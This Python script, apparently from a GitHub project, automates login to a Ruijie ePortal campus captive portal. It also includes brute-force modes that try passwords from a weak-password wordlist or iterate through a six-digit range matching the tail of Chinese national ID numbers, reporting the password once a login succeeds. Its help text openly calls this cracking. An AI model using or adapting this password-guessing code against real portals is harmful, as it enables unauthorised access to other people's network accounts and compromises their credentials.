# !/usr/bin/env python
# -*-coding:utf-8-*-
import sys
import requests
#from threading import Timer
from time import sleep

USERNAME = '-1'
PASSWORD = '-1'
SERVICE = r'0'
OPENURL = r'http://www.google.cn/generate_204'
ERR_STR = """
       -h    显示帮助,输入此项后只输出提示.

       -v    显示完整输出.

       -u [字符串 user]    *后面加用户名(必填).

       -p [字符串 password]   *后面加密码(必填).
             1)可以直接填写密码
             #暴力破解注意事项# 跑密码建议请选择可以登录"校园网络"的接入点测试,或者请选择正确的运营商.
             2)file:文件路径 可以实现跑弱口令,逐行读取.
             3)run:数字1-数字2 从 数字1 跑到 数字2 结束,
                (身份证后六位范围010000-319999).

       -id [数字 0到1]  后面输入0-3 默认0,[
             0="校园网络",
             1="中国移动ChinaMobile",
             2="中国电信ChinaTelecom",
             3="中国联通ChinaUnicom"]

       -t  [数字 秒]  循环登录,会根据当前输入的账号密码反复执行,延时{time}秒.不可以和跑密码(file和run)同时使用.
             停止请CRTL+C.
        
        https://github.io/alittlemc/ePortal-Web-Ruijie
        version 1.3
"""

def get_captive_server_response():
    return requests.get(OPENURL)


def start(code, response):
    id = [" ",
          "%e4%b8%ad%e5%9b%bd%e7%a7%bb%e5%8a%a8ChinaMobile",
          "%e4%b8%ad%e5%9b%bd%e7%94%b5%e4%bf%a1ChinaTelecom",
          "%e4%b8%ad%e5%9b%bd%e8%81%94%e9%80%9aChinaUnicom"]
    if "-v" in code:
        print_v = True
    else:
        print_v = False

    if "-u" in code:
        USERNAME = code[code.index("-u")+1]

    if "-id" in code:
        id_i = int(code[code.index("-id")+1])
        if id_i >= len(id):
            id_i = 0
    else:
        id_i = 0

    SERVICE = id[id_i]

    if "-t" in code:
        t=int(code[code.index("-t")+1])
    else:
        t=0
    if "-p" in code:
        PASSWORD = code[code.index("-p")+1]
        i = 0
        if "file:" in PASSWORD:
            
            PASSWORD = PASSWORD[5:]
            for p in open(PASSWORD):
                p=p.replace("\n","")
                i += 1
                re = login(response, USERNAME, str(p), SERVICE)

                if "success" in re:
                    return '{\"result\":\"success\",\"message\",\"第'+str(i)+'次尝试完成,密码是'+p+'\"}'
                elif print_v:
                    print(p+":\n"+re)
            return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
        elif "run:" in PASSWORD:
            try:
                arr = PASSWORD[4:].split("-")
                for p in range(int(arr[0]), int(arr[1])+1):
                    p=str(p)
                    l=len(p)
                    if l<6:
                        p="0"*(6-l)+p
                    i += 1
                    re = login(response, USERNAME, str(p), SERVICE)
                    if "success" in re:
                        return '{\"result\":\"success\",\"message\",\"第'+str(i)+'次尝试完成,密码是'+p+'\"}'
                    elif print_v:
                        print(p+":\n"+re)
                return '{\"result\":\"false\",\"message\",\"尝试'+str(i)+'次,没有匹配到密码\"}'
            except Exception as e:
                print(e, '95-lin')

        else:
            if t>0:
                i=1
                while i:
                    print("编号",i)
                    #t = Timer(t, login, [response, USERNAME, PASSWORD, SERVICE])
                    #t.start()
                    print(login(response, USERNAME, PASSWORD, SERVICE))
                    sleep(t)
                    i+=1
                #t.cancel()
            else:
                return login(response, USERNAME, PASSWORD, SERVICE)

def login(response, USERNAME, PASSWORD, SERVICE):
    response_text = response.text
    login_page_url = response_text.split('\'')[1]
    login_url = login_page_url.split('?')[0].replace(
        'index.jsp', 'InterFace.do?method=login')
    query_string = login_page_url.split('?')[1]
    query_string = query_string.replace('&', '%2526')
    query_string = query_string.replace('=', '%253D')
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
    }
    login_post_data = 'userId={}&password={}&service={}&queryString={}&operatorPwd=&operatorUserId=&validcode=&passwordEncrypt=false'.format(
        USERNAME, PASSWORD, SERVICE, query_string)
    login_result = requests.post(
        url=login_url,
        data=login_post_data,
        headers=headers
    )
    
    return login_result.content.decode('utf-8')


if __name__ == '__main__':
    try:
        if "-h" in sys.argv:
            print(ERR_STR)
        else:
            captive_server_response = get_captive_server_response()
            if captive_server_response.status_code != 204:
                print(start(sys.argv, captive_server_response))
            else:
                print('当前已经可以连接网络,无需连接')
    except Exception as e:
        print("#错误信息",e,"\n",)
